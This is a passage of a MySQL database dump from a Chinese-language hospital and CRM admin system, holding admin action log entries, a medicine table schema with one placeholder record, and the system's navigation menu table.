INSERT INTO `xy_log` VALUES ('181', '2018-10-31 10:22:34', 'admin', '编辑成功', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Member/edit.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('182', '2018-10-31 10:22:46', 'admin', '编辑成功', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Member/edit.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('183', '2018-10-31 10:34:08', 'admin', '编辑成功', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Member/edit.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('184', '2018-10-31 11:05:31', 'admin', '编辑成功', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Member/edit.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('185', '2018-10-31 13:06:35', 'admin', '清理成功', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Member/del.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('186', '2018-10-31 13:06:39', 'admin', '清理成功', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Member/del.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('187', '2018-10-31 13:06:44', 'admin', '清理成功', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Member/del.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('188', '2018-10-31 13:06:49', 'admin', '清理成功', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Member/del.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('189', '2018-10-31 13:07:04', 'admin', '编辑成功', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Member/edit.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('190', '2018-10-31 13:07:20', 'admin', '编辑成功', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Member/edit.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('191', '2018-10-31 13:07:40', 'admin', '编辑成功', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Member/edit.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('192', '2018-10-31 13:08:16', 'admin', '新增成功29', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Member/add.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('193', '2018-10-31 13:08:49', 'admin', '编辑成功', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Member/edit.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('194', '2018-10-31 13:10:22', 'admin', '编辑成功', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Member/edit.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('195', '2018-10-31 13:23:39', 'admin', '新增成功15', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Hospital/add.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('196', '2018-10-31 14:34:31', 'admin', '编辑成功14', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Project/edit.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('197', '2018-10-31 14:34:42', 'admin', '编辑成功14', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Project/edit.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('198', '2018-11-05 14:49:02', 'admin', '登录成功！', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 ', '/weiling/index.php?s=/Home/Public/Login.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('199', '2018-11-05 14:49:38', 'admin', '清理0条无用的记录', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 ', '/weiling/index.php?s=/Home/Msg/del.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('200', '2018-11-05 17:35:59', 'admin', '新增成功231', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 ', '/weiling/index.php?s=/Home/Menu/add.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('201', '2018-11-06 08:41:15', 'admin', '登录成功！', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 ', '/weiling/index.php?s=/Home/Public/Login.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('202', '2018-11-06 11:23:56', 'admin', '锁定4', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 ', '/weiling/index.php?s=/Home/Cust/lock.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('203', '2018-11-06 11:44:14', 'admin', '锁定1', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 ', '/weiling/index.php?s=/Home/Picture/lock.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('204', '2018-11-06 11:44:19', 'admin', '启用1', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 ', '/weiling/index.php?s=/Home/Picture/lock.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('205', '2018-11-06 11:57:02', 'admin', '编辑成功', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 ', '/weiling/index.php?s=/Home/Member/edit.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('206', '2018-11-06 11:57:22', 'admin', '编辑成功', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 ', '/weiling/index.php?s=/Home/Member/edit.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('207', '2018-11-06 11:58:14', 'admin', '编辑成功', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 ', '/weiling/index.php?s=/Home/Member/edit.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('208', '2018-11-06 11:59:59', 'admin', '编辑成功', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 ', '/weiling/index.php?s=/Home/Member/edit.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('209', '2018-11-06 13:12:32', 'admin', '编辑成功29', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 ', '/weiling/index.php?s=/Home/Member/edit.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('210', '2018-11-06 13:13:35', 'admin', '编辑成功29', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 ', '/weiling/index.php?s=/Home/Member/edit.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('211', '2018-11-06 13:14:43', 'admin', '新增成功2', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 ', '/weiling/index.php?s=/Home/Picture/add.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('212', '2018-11-06 13:17:07', 'admin', '新增成功3', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 ', '/weiling/index.php?s=/Home/Picture/add.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('213', '2018-11-06 13:20:46', 'admin', '清理成功', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 ', '/weiling/index.php?s=/Home/Picture/del.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('214', '2018-11-06 13:20:52', 'admin', '清理成功', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 ', '/weiling/index.php?s=/Home/Picture/del.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('215', '2018-11-06 13:21:02', 'admin', '新增成功4', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 ', '/weiling/index.php?s=/Home/Picture/add.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('216', '2018-11-06 13:21:20', 'admin', '新增成功5', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 ', '/weiling/index.php?s=/Home/Picture/add.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('217', '2018-11-06 13:21:33', 'admin', '新增成功6', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 ', '/weiling/index.php?s=/Home/Picture/add.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('218', '2018-11-06 13:21:37', 'admin', '清理成功', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 ', '/weiling/index.php?s=/Home/Picture/del.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('219', '2018-11-06 13:21:42', 'admin', '清理成功', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 ', '/weiling/index.php?s=/Home/Picture/del.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('220', '2018-11-06 13:21:47', 'admin', '锁定4', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 ', '/weiling/index.php?s=/Home/Picture/lock.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('221', '2018-11-06 13:23:47', 'admin', '编辑成功4', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 ', '/weiling/index.php?s=/Home/Picture/edit.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('222', '2018-11-06 13:24:42', 'admin', '清理成功', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 ', '/weiling/index.php?s=/Home/Picture/del.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('223', '2018-11-06 13:24:54', 'admin', '编辑成功1', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 ', '/weiling/index.php?s=/Home/Picture/edit.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('224', '2018-11-06 13:25:50', 'admin', '编辑成功1', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 ', '/weiling/index.php?s=/Home/Picture/edit.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('225', '2018-11-06 15:48:27', 'admin', '新增成功232', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 ', '/weiling/index.php?s=/Home/Menu/add.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('226', '2018-11-07 11:08:03', 'admin', '登录成功！', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 ', '/weiling/index.php?s=/Home/Public/Login.html', '223.101.17.162');
INSERT INTO `xy_log` VALUES ('227', '2018-11-08 16:45:04', 'admin', '登录成功！', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 ', '/weiling/index.php?s=/Home/Public/Login.html', '223.101.17.49');
INSERT INTO `xy_log` VALUES ('228', '2018-11-08 16:55:31', 'admin', '登录成功！', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 ', '/weiling/index.php?s=/Home/Public/Login.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('229', '2018-11-08 17:49:16', 'admin', '新增成功0', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 ', '/weiling/index.php?s=/Home/Address/add.html', '223.101.17.49');
INSERT INTO `xy_log` VALUES ('230', '2018-11-10 08:39:59', 'admin', '登录成功！', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 ', '/weiling/index.php?s=/Home/Public/Login.html', '223.101.17.17');
INSERT INTO `xy_log` VALUES ('231', '2018-11-10 09:09:31', 'admin', '新增成功2', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 ', '/weiling/index.php?s=/Home/Address/add.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('232', '2018-11-10 09:12:38', 'admin', '新增成功3', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 ', '/weiling/index.php?s=/Home/Address/add.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('233', '2018-11-10 09:17:16', 'admin', '新增成功4', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 ', '/weiling/index.php?s=/Home/Address/add.html', '223.101.17.17');
INSERT INTO `xy_log` VALUES ('234', '2018-11-10 09:21:50', 'admin', '新增成功5', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 ', '/weiling/index.php?s=/Home/Address/add.html', '223.101.17.17');
INSERT INTO `xy_log` VALUES ('235', '2018-11-10 09:51:56', 'admin', '清理成功', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 ', '/weiling/index.php?s=/Home/Address/del.html', '223.101.17.17');
INSERT INTO `xy_log` VALUES ('236', '2018-11-12 08:57:01', 'admin', '登录成功！', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 ', '/weiling/index.php?s=/Home/Public/Login.html', '223.101.17.106');

-- ----------------------------
-- Table structure for `xy_medicine`
-- ----------------------------
DROP TABLE IF EXISTS `xy_medicine`;
CREATE TABLE `xy_medicine` (
  `id` int(4) unsigned NOT NULL AUTO_INCREMENT COMMENT 'id',
  `name` varchar(32) NOT NULL COMMENT '药品名称',
  `price` varchar(32) NOT NULL COMMENT '药品单价',
  `blfy` longtext NOT NULL COMMENT '不良反应',
  `mtype` varchar(32) NOT NULL COMMENT '剂型',
  `format` varchar(32) NOT NULL COMMENT '规格型号',
  `typeid` int(4) NOT NULL COMMENT '分类id',
  `count` varchar(32) NOT NULL COMMENT '单位',
  `main` longtext NOT NULL COMMENT '主要成分',
  `use` longtext NOT NULL COMMENT '用法用量',
  `storage` longtext NOT NULL COMMENT '存储方式',
  `pzwh` longtext NOT NULL COMMENT '批准文号',
  `start_time` varchar(32) NOT NULL COMMENT '生产日期',
  `upto` varchar(32) NOT NULL COMMENT '保质期',
  `end_time` varchar(32) NOT NULL COMMENT '有效期至',
  `company` varchar(32) NOT NULL COMMENT '生产单位',
  `cure` longtext NOT NULL COMMENT '主治',
  `img` longtext NOT NULL COMMENT '药品图片',
  `num` varchar(32) NOT NULL COMMENT '库存',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of xy_medicine
-- ----------------------------
INSERT INTO `xy_medicine` VALUES ('3', '我这里的', '10', '我这里的', '我这里的', '321', '9', '123', '231', '213', '4', '231', '1539878400', '312', '1539187200', '231', '165', '/2018-10-25/5bd191c290e7a.jpg', '90');

-- ----------------------------
-- Table structure for `xy_menu`
-- ----------------------------
DROP TABLE IF EXISTS `xy_menu`;
CREATE TABLE `xy_menu` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `level` tinyint(1) NOT NULL,
  `pid` int(4) NOT NULL,
  `catename` char(20) NOT NULL DEFAULT '',
  `alink` char(100) NOT NULL DEFAULT '',
  `sort` int(4) NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT '1',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=233 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of xy_menu
-- ----------------------------
INSERT INTO `xy_menu` VALUES ('1', '0', '0', '客户管理', 'kehu/index', '1', '1');
INSERT INTO `xy_menu` VALUES ('8', '1', '1', '已成交', 'hetong/index', '3', '1');
INSERT INTO `xy_menu` VALUES ('7', '0', '0', '系统管理', 'system/index', '99', '1');
INSERT INTO `xy_menu` VALUES ('9', '1', '7', '组织机构', 'org/index', '1', '1');
INSERT INTO `xy_menu` VALUES ('10', '2', '9', '职位管理', 'dep/index', '2', '1');
INSERT INTO `xy_menu` VALUES ('11', '2', '22', '菜单管理', 'menu/index', '4', '1');
INSERT INTO `xy_menu` VALUES ('13', '1', '7', '操作日志', 'Log/index', '7', '1');
INSERT INTO `xy_menu` VALUES ('14', '2', '9', '用户管理', 'user/index', '3', '1');
INSERT INTO `xy_menu` VALUES ('21', '1', '7', '备份文件', 'database/bakup', '5', '1');
INSERT INTO `xy_menu` VALUES ('19', '2', '22', '功能列表', 'rule/index', '5', '1');
INSERT INTO `xy_menu` VALUES ('22', '1', '7', '系统设置', 'system/index', '1', '1');
INSERT INTO `xy_menu` VALUES ('23', '2', '9', '部门管理', 'org/index', '0', '1');
INSERT INTO `xy_menu` VALUES ('24', '1', '7', '数据备份', 'Database/index', '4', '1');
INSERT INTO `xy_menu` VALUES ('25', '2', '22', '分类字典', 'datalist/index', '2', '1');
INSERT INTO `xy_menu` VALUES ('31', '2', '22', '数据字典', 'config/index', '1', '1');
INSERT INTO `xy_menu` VALUES ('107', '2', '119', '跟单记录', 'custgd/index', '2', '1');
INSERT INTO `xy_menu` VALUES ('108', '2', '119', '潜在客户', 'cust/index', '0', '1');
INSERT INTO `xy_menu` VALUES ('109', '2', '119', '联系人', 'custcon/index', '1', '1');
INSERT INTO `xy_menu` VALUES ('113', '0', '0', '统计报表', 'tongji/index', '18', '1');
INSERT INTO `xy_menu` VALUES ('114', '2', '118', '消息记录', 'msgs/index', '1', '1');
INSERT INTO `xy_menu` VALUES ('115', '2', '118', '邮件记录', 'emails/index', '2', '1');
INSERT INTO `xy_menu` VALUES ('117', '2', '118', '短信记录', 'smss/index', '3', '1');
INSERT INTO `xy_menu` VALUES ('118', '1', '113', '通信记录', 'tongji/index', '11', '1');
INSERT INTO `xy_menu` VALUES ('119', '1', '1', '成交前', 'cust/index', '1', '1');
INSERT INTO `xy_menu` VALUES ('120', '2', '8', '成交客户', 'cust/cheng', '1', '1');
INSERT INTO `xy_menu` VALUES ('121', '2', '8', '新增合同', 'hetong/add', '2', '1');
INSERT INTO `xy_menu` VALUES ('122', '2', '8', '合同审核', 'hetong/dshenhe', '3', '1');
INSERT INTO `xy_menu` VALUES ('123', '2', '8', '合同管理', 'hetong/index', '4', '1');
INSERT INTO `xy_menu` VALUES ('124', '2', '119', '待跟踪客户', 'cust/daoqi', '4', '1');
INSERT INTO `xy_menu` VALUES ('125', '1', '1', '合同执行', 'cust/index', '3', '1');
INSERT INTO `xy_menu` VALUES ('126', '2', '125', '收款记录', 'shou/index', '1', '1');
INSERT INTO `xy_menu` VALUES ('127', '2', '125', '开票记录', 'kaipiao/index', '2', '1');
INSERT INTO `xy_menu` VALUES ('128', '2', '125', '出库记录', 'chuku/index', '3', '1');
INSERT INTO `xy_menu` VALUES ('129', '2', '125', '发货记录', 'fahuo/index', '4', '1');
INSERT INTO `xy_menu` VALUES ('130', '2', '125', '付款记录', 'fukuan/index', '5', '1');
INSERT INTO `xy_menu` VALUES ('131', '1', '1', '售后服务', 'cust/index', '4', '1');
INSERT INTO `xy_menu` VALUES ('132', '2', '131', '客户回访', 'huifang/index', '1', '1');
INSERT INTO `xy_menu` VALUES ('133', '2', '131', '投诉管理', 'tousu/index', '2', '1');
INSERT INTO `xy_menu` VALUES ('134', '2', '131', '服务记录', 'renwu/index', '3', '1');
INSERT INTO `xy_menu` VALUES ('135', '0', '0', '仓库管理', 'cangku/index', '3', '1');
INSERT INTO `xy_menu` VALUES ('136', '1', '135', '入库', 'cangku/index', '1', '1');
INSERT INTO `xy_menu` VALUES ('137', '2', '136', '新增入库', 'ruku/add', '1', '1');
INSERT INTO `xy_menu` VALUES ('138', '2', '136', '退还入库', 'ruku/add', '2', '1');
INSERT INTO `xy_menu` VALUES ('139', '2', '136', '入库审核', 'ruku/dshenhe', '3', '1');
INSERT INTO `xy_menu` VALUES ('140', '2', '136', '入库记录', 'ruku/index', '4', '1');
INSERT INTO `xy_menu` VALUES ('141', '2', '136', '入库明细表', 'rukus/index', '5', '1');
INSERT INTO `xy_menu` VALUES ('142', '1', '135', '出库', 'chuku/index', '2', '1');
INSERT INTO `xy_menu` VALUES ('143', '2', '142', '新增出库', 'chuku/add', '1', '1');
INSERT INTO `xy_menu` VALUES ('144', '2', '142', '出库审核', 'chuku/dshenhe', '2', '1');
INSERT INTO `xy_menu` VALUES ('145', '2', '142', '出库记录', 'chuku/index', '3', '1');
INSERT INTO `xy_menu` VALUES ('146', '2', '142', '出库明细表', 'chukus/index', '4', '1');
INSERT INTO `xy_menu` VALUES ('147', '1', '135', '库存盘点', 'chanpin/index', '4', '1');
INSERT INTO `xy_menu` VALUES ('148', '1', '135', '发货记录', 'fahuo/index', '5', '1');
INSERT INTO `xy_menu` VALUES ('149', '0', '0', '财务管理', 'caiwu/index', '5', '1');
INSERT INTO `xy_menu` VALUES ('150', '1', '149', '收款', 'shou/index', '1', '1');
INSERT INTO `xy_menu` VALUES ('151', '2', '150', '新增收款', 'shou/add', '1', '1');
INSERT INTO `xy_menu` VALUES ('152', '2', '150', '收款审核', 'shou/dshenhe', '2', '1');
INSERT INTO `xy_menu` VALUES ('153', '2', '150', '收款记录', 'shou/index', '3', '1');
INSERT INTO `xy_menu` VALUES ('154', '1', '149', '付款', 'fukuan/index', '2', '1');
INSERT INTO `xy_menu` VALUES ('155', '2', '154', '新增付款', 'fukuan/add', '1', '1');
INSERT INTO `xy_menu` VALUES ('156', '2', '154', '付款审核', 'fukuan/dshenhe', '2', '1');
INSERT INTO `xy_menu` VALUES ('157', '2', '154', '付款记录', 'fukuan/index', '3', '1');
INSERT INTO `xy_menu` VALUES ('158', '1', '135', '产品管理', 'chanpin/index', '0', '1');
INSERT INTO `xy_menu` VALUES ('159', '1', '135', '库存报警', 'chanpin/baojing', '3', '1');
INSERT INTO `xy_menu` VALUES ('232', '1', '216', '地址管理', 'address/index', '4', '1');
INSERT INTO `xy_menu` VALUES ('231', '1', '216', '轮播图管理', 'picture/index', '3', '1');
INSERT INTO `xy_menu` VALUES ('230', '1', '228', '医院列表', 'hospital/index', '1', '1');
INSERT INTO `xy_menu` VALUES ('229', '1', '228', '科室列表', 'project/index', '0', '1');
INSERT INTO `xy_menu` VALUES ('228', '0', '0', '远程会诊管理', 'far/index', '24', '1');
INSERT INTO `xy_menu` VALUES ('227', '1', '222', '药品核销', 'medicine/clear', '3', '1');
INSERT INTO `xy_menu` VALUES ('225', '1', '222', '药品分类管理', 'mtype/index', '0', '1');
INSERT INTO `xy_menu` VALUES ('181', '2', '131', '到期的合同', 'hetong/daoqi', '0', '1');
INSERT INTO `xy_menu` VALUES ('226', '1', '222', '药品列表', 'medicine/index', '1', '1');
INSERT INTO `xy_menu` VALUES ('169', '2', '168', '我的文档', 'wendang/index', '1', '1');
INSERT INTO `xy_menu` VALUES ('170', '2', '168', '共享给我的', 'wendangs/index', '2', '1');
INSERT INTO `xy_menu` VALUES ('171', '2', '168', '知识管理', 'zhishi/index', '3', '1');
INSERT INTO `xy_menu` VALUES ('222', '0', '0', '药品管理', 'mtype/index', '22', '1');
INSERT INTO `xy_menu` VALUES ('173', '2', '172', '我的消息', 'msg/index', '1', '1');
INSERT INTO `xy_menu` VALUES ('174', '2', '172', '通知公告', 'tongzhi/index', '2', '1');
INSERT INTO `xy_menu` VALUES ('220', '1', '218', '档案列表', 'case/index', '0', '1');
INSERT INTO `xy_menu` VALUES ('176', '2', '175', '我的通讯录', 'wdtxl/index', '1', '1');
INSERT INTO `xy_menu` VALUES ('177', '2', '175', '公共通讯录', 'ggtxl/index', '2', '1');
INSERT INTO `xy_menu` VALUES ('178', '2', '175', '单位通讯录', 'dwtxl/index', '3', '1');
INSERT INTO `xy_menu` VALUES ('179', '1', '7', '清理缓存', 'public/clear', '10', '1');
INSERT INTO `xy_menu` VALUES ('180', '2', '8', '合同明细表', 'hetongs/index', '6', '1');
INSERT INTO `xy_menu` VALUES ('182', '1', '149', '开票记录', 'kaipiao/index', '4', '1');
INSERT INTO `xy_menu` VALUES ('183', '1', '113', '客户管理', 'fxcust/index', '4', '1');
INSERT INTO `xy_menu` VALUES ('184', '2', '183', '综合分析', 'fxcust/index', '1', '1');
INSERT INTO `xy_menu` VALUES ('185', '2', '183', '需求分析', 'fxcust/index', '2', '1');
INSERT INTO `xy_menu` VALUES ('186', '2', '183', '来源分析', 'fxcust/index', '3', '1');
INSERT INTO `xy_menu` VALUES ('187', '2', '183', '进展分析', 'fxcust/index', '4', '1');
INSERT INTO `xy_menu` VALUES ('188', '2', '183', '业务员分析', 'fxcust/index', '5', '1');
INSERT INTO `xy_menu` VALUES ('189', '2', '183', '增长趋势分析', 'fxcust/index', '6', '1');
INSERT INTO `xy_menu` VALUES ('190', '1', '113', '合同管理', 'fxhetong/index', '5', '1');
INSERT INTO `xy_menu` VALUES ('191', '2', '190', '综合分析', 'fxhetong/index', '5', '1');
INSERT INTO `xy_menu` VALUES ('192', '2', '190', '增长趋势(数量)', 'fxhetong/index', '2', '1');
INSERT INTO `xy_menu` VALUES ('193', '2', '190', '增长趋势(签约金额)', 'fxhetong/index', '3', '1');
INSERT INTO `xy_menu` VALUES ('194', '2', '190', '增长趋势(已收款)', 'fxhetong/index', '4', '1');
INSERT INTO `xy_menu` VALUES ('195', '2', '190', '增长趋势(未收款)', 'fxhetong/index', '5', '1');
INSERT INTO `xy_menu` VALUES ('196', '2', '190', '增长趋势(已开票)', 'fxhetong/index', '6', '1');
INSERT INTO `xy_menu` VALUES ('197', '2', '190', '类型分析', 'fxhetong/index', '7', '1');
INSERT INTO `xy_menu` VALUES ('198', '2', '190', '业务员分析', 'fxhetong/index', '8', '1');
INSERT INTO `xy_menu` VALUES ('199', '1', '113', '仓库管理', 'fxchanpin/index', '3', '1');
INSERT INTO `xy_menu` VALUES ('200', '2', '199', '入库分析', 'fxchanpin/index', '1', '1');
INSERT INTO `xy_menu` VALUES ('201', '2', '199', '出库分析', 'fxchanpin/index', '2', '1');
INSERT INTO `xy_menu` VALUES ('202', '1', '113', '财务管理', 'fxcaiwu/index', '7', '1');
INSERT INTO `xy_menu` VALUES ('203', '2', '202', '收款分析', 'fxcaiwu/index', '1', '1');
INSERT INTO `xy_menu` VALUES ('204', '2', '202', '付款分析', 'fxcaiwu/index', '2', '1');
INSERT INTO `xy_menu` VALUES ('205', '2', '202', '付款类型', 'fxcaiwu/index', '3', '1');
